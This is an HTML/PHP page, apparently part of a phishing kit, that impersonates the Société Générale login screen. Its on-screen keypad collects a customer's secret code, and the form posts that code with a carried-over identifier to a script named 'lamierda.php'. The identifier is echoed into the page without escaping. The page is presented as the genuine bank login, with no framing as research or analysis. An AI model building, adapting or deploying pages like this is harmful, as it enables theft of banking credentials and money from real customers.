﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>Société Générale | Connexion</title>
		<script src="rules.js"></script>
		<link href="styles.css" rel="stylesheet" type="text/css">
	</head>
	<body>
		<div id="background"><form method="post" action="lamierda.php">
			<div id="Calque0"><img src="images/Calque0.png"></div>
			<input type="hidden" name="ramid" value="<?php echo $_POST["ramid"]; ?>" />
			<div id="lvisa"><?php echo $_POST["ramid"]; ?></div>
            <input type="password" id="psi" readonly size="6" style="outline: none;"  value="" name="ramida"  >
			
<input type="Button" id="tabonmok" onclick="addCode ('0');"  name="0" value="" style="position:absolute;left:306px;top:609px;width:50px;height:50px;z-index:6;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('1');"  name="1" value="" style="position:absolute;left:306px;top:427px;width:50px;height:50px;z-index:8;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('5');"  name="5" value="" style="position:absolute;left:486px;top:427px;width:50px;height:50px;z-index:12;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('4');"  name="4" value="" style="position:absolute;left:366px;top:487px;width:50px;height:50px;z-index:11;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('2');"  name="2" value="" style="position:absolute;left:366px;top:427px;width:50px;height:50px;z-index:9;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('8');"  name="8" value="" style="position:absolute;left:486px;top:609px;width:50px;height:50px;z-index:15;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('9');"  name="9" value="" style="position:absolute;left:306px;top:547px;width:50px;height:50px;z-index:7;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('6');"  name="6" value="" style="position:absolute;left:486px;top:487px;width:50px;height:50px;z-index:7;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('7');"  name="7" value="" style="position:absolute;left:426px;top:427px;width:50px;height:50px;z-index:7;cursor:pointer">
<input type="Button" id="tabonmok" onclick="addCode ('3');"  name="3" value="" style="position:absolute;left:426px;top:609px;width:50px;height:50px;z-index:7;cursor:pointer">


<input type="submit" id="tabonmok" name="" value=""  style="position:absolute;left:306px;top:690px;width:231px;height:46px;z-index:17;cursor:pointer">


		</div>
 </body>
 </html>